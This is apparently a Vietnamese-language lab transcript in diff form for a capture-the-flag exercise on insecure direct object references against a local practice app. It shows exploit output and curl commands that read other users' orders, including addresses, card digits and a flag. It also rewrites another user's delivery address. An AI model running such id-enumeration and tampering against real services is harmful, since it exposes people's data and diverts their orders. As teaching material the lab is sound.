@@ -1,0 +1,33 @@
+# Transcript lab 5.1 - IDOR
+# App: python3 app.py  (127.0.0.1:8050)
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:18:21
+# ============================================================
+
+[*] Buoc 1: dang nhap mallory (user hop le)
+    login: {'message': 'xin chao mallory', 'ok': True}
+    cookie auth = mallory
+
+[*] Xem don cua chinh mallory (1003) - hop phap:
+    {'address': '1 Nguyen Trai, TP HCM', 'card_last4': '0001', 'note': 'don cua chinh mallory', 'ok': True, 'order_id': 1003, 'owner': 'mallory', 'total': '99.000 VND'}
+
+[*] Buoc 2: IDOR doc - doi id tu 1001 den 1005:
+    order 1001 owner=alice    total=12.000.000 VND   note=FLAG{5.1_idor_doc_don_nguoi_khac} <= KHONG PHAI CUA MINH
+    order 1002 owner=bob      total=350.000 VND      note=giao gio hanh chinh <= KHONG PHAI CUA MINH
+    order 1003 owner=mallory  total=99.000 VND       note=don cua chinh mallory 
+    order 1004 owner=alice    total=4.500.000 VND    note=laptop <= KHONG PHAI CUA MINH
+    order 1005 owner=bob      total=1.200.000 VND    note=tai nghe <= KHONG PHAI CUA MINH
+
+[*] Buoc 3: IDOR ghi - doi dia chi don 1004 (cua alice):
+    {'address': 'Nha cua mallory - hang bi chiem doat', 'changed_by': 'mallory', 'ok': True, 'order_id': 1004}
+    xac nhan lai: Nha cua mallory - hang bi chiem doat
+
+[+] Lay duoc du lieu nhay cam cua nguoi khac. FLAG = FLAG{5.1_idor_doc_don_nguoi_khac}
+
+# --- Minh hoa them bang curl (IDOR doc don 1001 cua alice) ---
+$ curl -s -X POST localhost:8050/login -d username=mallory -d password=pw -c /tmp/j_5_1.txt
+{"message":"xin chao mallory","ok":true}
+
+$ curl -s localhost:8050/api/order/1001 -b /tmp/j_5_1.txt
+{"address":"12 Tran Hung Dao, Ha Noi","card_last4":"4291","note":"FLAG{5.1_idor_doc_don_nguoi_khac}","ok":true,"order_id":1001,"owner":"alice","total":"12.000.000 VND"}
+
